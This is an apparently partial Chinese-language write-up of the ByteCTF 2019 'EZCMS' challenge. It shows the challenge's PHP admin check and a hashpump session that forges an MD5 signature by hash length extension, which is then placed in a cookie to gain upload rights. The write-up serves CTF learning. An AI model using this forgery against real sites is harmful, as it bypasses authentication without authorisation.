# ByteCTF 2019

## 0x01 EZCMS

看题名就知道是个代码审计题，扫一下目录发现``www.zip``拿到源码

首先是hash扩展攻击，拿到上传权限

```php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;

}

function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```

这里构造

```
root@EDI:~/HashPump# hashpump
Input Signature: 52107b08c0f3342d2153ae1d68e6262c
Input Data: admin
Input Key Length: 13
Input Data to Add: eki
bcbbe3284dc03be00f59d52a7633aeb5
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00eki
```

然后上传的时候把``bcbbe3284dc03be00f59d52a7633aeb5``塞到cookie就可了